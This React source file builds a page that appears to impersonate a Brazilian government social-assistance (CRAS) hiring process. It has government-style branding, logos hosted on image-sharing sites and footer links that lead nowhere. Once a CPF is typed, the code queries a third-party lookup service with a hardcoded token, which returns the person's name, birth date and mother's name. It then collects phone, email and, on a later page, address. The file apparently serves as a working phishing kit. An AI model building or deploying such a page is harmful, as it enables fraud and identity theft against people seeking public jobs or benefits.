import React, { useState, useEffect } from 'react';
import { Shield, ArrowRight, Users, Facebook, Instagram } from 'lucide-react';

const RegistrationPage: React.FC = () => {
  const [formData, setFormData] = useState({
    cpf: '',
    fullName: '',
    birthDate: '',
    motherName: '',
    phone: '',
    email: ''
  });
  const [showAdditionalFields, setShowAdditionalFields] = useState(false);
  const [selectedUnit, setSelectedUnit] = useState<any>(null);
  const [isLoadingCpf, setIsLoadingCpf] = useState(false);
  const [cpfError, setCpfError] = useState('');

  useEffect(() => {
    // Get selected CRAS unit from localStorage
    const unitData = localStorage.getItem('selectedCrasUnit');
    if (unitData) {
      setSelectedUnit(JSON.parse(unitData));
    }
  }, []);

  const fetchCpfData = async (cpf: string) => {
    setIsLoadingCpf(true);
    setCpfError('');
    
    try {
      const cleanCpf = cpf.replace(/\D/g, '');
      const apiUrl = `https://consulta.fontesderenda.blog/cpf.php?token=6285fe45-e991-4071-a848-3fac8273c82a&cpf=${cleanCpf}`;
      
      const response = await fetch(apiUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        }
      });
      
      if (response.ok) {
        const data = await response.json();
        
        if (data.DADOS) {
          const cpfData = data.DADOS;
          
          // Format birth date from "1984-09-07 00:00:00" to "1984-09-07"
          let formattedBirthDate = '';
          if (cpfData.data_nascimento) {
            formattedBirthDate = cpfData.data_nascimento.split(' ')[0];
          }
          
          setFormData(prev => ({
            ...prev,
            fullName: cpfData.nome || '',
            birthDate: formattedBirthDate,
            motherName: cpfData.nome_mae || ''
          }));
          
          setShowAdditionalFields(true);
        } else {
          setCpfError('CPF não encontrado na base de dados.');
          // Still show additional fields for manual input
          setShowAdditionalFields(true);
        }
      } else {
        setCpfError('Erro ao consultar CPF. Preencha os dados manualmente.');
        setShowAdditionalFields(true);
      }
    } catch (error) {
      console.error('Error fetching CPF data:', error);
      setCpfError('Erro na consulta. Preencha os dados manualmente.');
      setShowAdditionalFields(true);
    } finally {
      setIsLoadingCpf(false);
    }
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 11) {
      value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, (match, p1, p2, p3, p4) => {
        if (p4) return `${p1}.${p2}.${p3}-${p4}`;
        if (p3) return `${p1}.${p2}.${p3}`;
        if (p2) return `${p1}.${p2}`;
        return p1;
      });
      
      setFormData(prev => ({ ...prev, cpf: value }));
      setCpfError('');

      // If CPF is complete (11 digits), fetch data from API
      if (value.replace(/\D/g, '').length === 11) {
        fetchCpfData(value);
      } else {
        setShowAdditionalFields(false);
      }
    }
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 11) {
      value = value.replace(/(\d{2})(\d{4,5})(\d{4})/, (match, p1, p2, p3) => {
        if (p3) return `(${p1}) ${p2}-${p3}`;
        if (p2) return `(${p1}) ${p2}`;
        return p1;
      });
      setFormData(prev => ({ ...prev, phone: value }));
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Save form data to localStorage
    localStorage.setItem('candidateCPF', formData.cpf);
    localStorage.setItem('candidateName', formData.fullName);
    localStorage.setItem('candidatePhone', formData.phone);
    localStorage.setItem('candidateEmail', formData.email);
    localStorage.setItem('candidateBirthDate', formData.birthDate);
    localStorage.setItem('candidateMotherName', formData.motherName);
    
    const userData = {
      cpf: formData.cpf,
      full_name: formData.fullName,
      phone: formData.phone,
      email: formData.email,
      birth_date: formData.birthDate,
      mother_name: formData.motherName,
      selected_unit: selectedUnit
    };
    
    localStorage.setItem('userData', JSON.stringify(userData));
    
    // Navigate to address page
    window.history.pushState({}, '', '/address');
    window.location.reload();
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-50">
      {/* Government Header */}
      <header className="bg-[#222222] text-white py-2">
        <div className="container mx-auto flex justify-between items-center px-4">
          <a className="font-bold text-sm" href="#">
            <img 
              src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" 
              alt="Logotipo Governo" 
              className="h-6"
            />
          </a>
          <nav>
            <ul className="flex space-x-4 text-[10px]">
              <li>
                <a className="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
              </li>
              <li>
                <a className="hover:underline" href="#">PARTICIPE</a>
              </li>
              <li>
                <a className="hover:underline" href="#">SERVIÇOS</a>
              </li>
            </ul>
          </nav>
        </div>
      </header>

      {/* CRAS Header */}
      <div className="bg-[#044785] py-3">
        <div className="container mx-auto px-4 text-center">
          <img 
            src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" 
            alt="Logo CRAS" 
            className="h-8 mx-auto"
          />
        </div>
      </div>

      <main className="flex-grow container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto">
          <div className="mb-8">
            <h1 className="text-2xl font-bold text-gray-900 mb-4">Processo Seletivo Assistente Social</h1>
            <p className="text-gray-700 mb-2">Sistema de Cadastro para Processo Seletivo do CRAS</p>
            <div className="h-1 w-32 bg-[#1451B4]"></div>
          </div>

          {/* Selected Unit Info */}
          {selectedUnit && (
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <h3 className="font-semibold text-blue-900 mb-2">Unidade Selecionada:</h3>
              <p className="text-blue-800">{selectedUnit.name}</p>
              <p className="text-blue-700 text-sm">{selectedUnit.address}</p>
            </div>
          )}

          <div className="bg-white shadow-sm rounded-lg p-6 mb-8 border border-gray-200">
            <div className="flex items-start space-x-4 mb-6">
              <div className="flex-shrink-0">
                <Shield className="text-2xl text-[#1451B4]" size={32} />
              </div>
              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-2">Informações do Processo</h2>
                <p className="text-gray-700 text-sm">
                  Este é um processo seletivo para a vaga de Assistente Social do CRAS. 
                  Preencha seus dados corretamente para participar das etapas de seleção. 
                  Todas as informações serão verificadas e validadas durante o processo.
                </p>
              </div>
            </div>

            <form className="space-y-6 max-w-2xl mx-auto" onSubmit={handleSubmit}>
              <div>
                <label htmlFor="cpf" className="block text-sm font-medium text-black">CPF *</label>
                <div className="relative">
                  <input 
                    type="text" 
                    id="cpf" 
                    name="cpf" 
                    required 
                    maxLength={14}
                    value={formData.cpf}
                    onChange={handleCpfChange}
                    className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                    placeholder="000.000.000-00"
                  />
                  {isLoadingCpf && (
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                      <div className="animate-spin rounded-full h-5 w-5 border-2 border-[#1451B4] border-t-transparent"></div>
                    </div>
                  )}
                </div>
                <p className="mt-1 text-xs text-gray-600">Formato: 000.000.000-00</p>
                {cpfError && (
                  <p className="mt-1 text-xs text-red-600">{cpfError}</p>
                )}
                {isLoadingCpf && (
                  <p className="mt-1 text-xs text-blue-600">Consultando dados do CPF...</p>
                )}
              </div>

              <div>
                <label htmlFor="fullName" className="block text-sm font-medium text-black">Nome Completo *</label>
                <input 
                  type="text" 
                  id="fullName" 
                  name="fullName" 
                  required 
                  value={formData.fullName}
                  onChange={handleInputChange}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                />
              </div>

              {/* Additional fields shown when CPF is validated */}
              {showAdditionalFields && (
                <div className="space-y-6">
                  <div>
                    <label htmlFor="birthDate" className="block text-sm font-medium text-gray-900">Data de Nascimento</label>
                    <input 
                      type="date" 
                      id="birthDate" 
                      name="birthDate" 
                      value={formData.birthDate}
                      onChange={handleInputChange}
                      className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                    />
                  </div>

                  <div>
                    <label htmlFor="motherName" className="block text-sm font-medium text-gray-900">Nome da Mãe</label>
                    <input 
                      type="text" 
                      id="motherName" 
                      name="motherName" 
                      value={formData.motherName}
                      onChange={handleInputChange}
                      className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                    />
                  </div>
                </div>
              )}

              <div>
                <label htmlFor="phone" className="block text-sm font-medium text-gray-900">Telefone *</label>
                <input 
                  type="tel" 
                  id="phone" 
                  name="phone" 
                  required 
                  value={formData.phone}
                  onChange={handlePhoneChange}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50"
                  placeholder="(00) 00000-0000"
                />
                <p className="mt-1 text-xs text-gray-600">Formato: (00) 00000-0000</p>
              </div>

              <div>
                <label htmlFor="email" className="block text-sm font-medium text-gray-900">E-mail *</label>
                <input 
                  type="email" 
                  id="email" 
                  name="email" 
                  required 
                  value={formData.email}
                  onChange={handleInputChange}
                  className="mt-1 block w-full rounded-md border-gray-300 shadow-sm focus:border-[#1451B4] focus:ring focus:ring-[#1451B4] focus:ring-opacity-50 py-3 pl-4 font-semibold text-gray-700 bg-gray-50" 
                  placeholder="seu.email@exemplo.com"
                />
                <p className="mt-1 text-xs text-gray-600">Digite um e-mail válido para contato</p>
              </div>

              <div className="bg-gray-50 p-4 rounded-md border border-gray-200">
                <h3 className="text-sm font-medium text-gray-900 mb-2">Termo de Responsabilidade</h3>
                <p className="text-sm text-gray-700">
                  Ao prosseguir com o cadastro, declaro que todas as informações fornecidas são verdadeiras e estou 
                  ciente dos requisitos para participar do processo seletivo para Assistente Social do CRAS. 
                  Entendo que informações falsas podem resultar na desqualificação do processo.
                </p>
              </div>

              <div>
                <button 
                  type="submit" 
                  className="w-full flex justify-center items-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#1451B4] hover:bg-[#0c3d8a] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#1451B4] transition-colors duration-200"
                >
                  <ArrowRight className="mr-2" size={16} />
                  Iniciar Processo Seletivo
                </button>
              </div>
            </form>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#044785] text-white py-8 md:py-12">
        <div className="container mx-auto px-4 md:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">O que é o CRAS</a></li>
                <li><a href="#" className="hover:text-gray-200">Missão e Valores</a></li>
                <li><a href="#" className="hover:text-gray-200">Onde Atuamos</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Serviços</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Proteção Social Básica</a></li>
                <li><a href="#" className="hover:text-gray-200">Atendimento às Famílias</a></li>
                <li><a href="#" className="hover:text-gray-200">Grupos de Convivência</a></li>
                <li><a href="#" className="hover:text-gray-200">Benefícios Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Assistência Social</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Cadastro Único</a></li>
                <li><a href="#" className="hover:text-gray-200">Bolsa Família</a></li>
                <li><a href="#" className="hover:text-gray-200">BPC</a></li>
                <li><a href="#" className="hover:text-gray-200">Auxílio Brasil</a></li>
                <li><a href="#" className="hover:text-gray-200">Programas Sociais</a></li>
              </ul>
            </div>
            
            <div>
              <h3 className="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
              <ul className="space-y-2 text-sm text-white">
                <li><a href="#" className="hover:text-gray-200">Vagas</a></li>
                <li><a href="#" className="hover:text-gray-200">Portal do Servidor</a></li>
                <li><a href="#" className="hover:text-gray-200">Capacitações</a></li>
                <li><a href="#" className="hover:text-gray-200">Concursos</a></li>
              </ul>
            </div>
          </div>
          
          <hr className="border-blue-400 mb-6" />
          
          <div className="flex flex-col md:flex-row justify-between items-center text-xs text-white">
            <div className="mb-4 md:mb-0">
              <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
            </div>
            <div className="flex flex-wrap justify-center gap-2 md:gap-4">
              <a href="#" className="hover:text-gray-200">Mapa do Site</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Política de Privacidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Lei de Acesso à Informação</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Acessibilidade</a>
              <span>|</span>
              <a href="#" className="hover:text-gray-200">Ouvidoria</a>
            </div>
            <div className="flex space-x-4 mt-4 md:mt-0">
              <a href="#" className="text-white hover:text-gray-200">
                <Facebook size={16} />
              </a>
              <a href="#" className="text-white hover:text-gray-200">
                <Instagram size={16} />
              </a>
            </div>
          </div>
        </div>
      </footer>

      {/* Floating Accessibility Icon */}
      <a 
        href="#" 
        className="fixed bottom-4 right-4 bg-blue-600 p-3 rounded-full shadow-lg hover:bg-blue-700 transition-colors z-50"
      >
        <Users className="w-6 h-6 text-white" />
      </a>
    </div>
  );
};

export default RegistrationPage;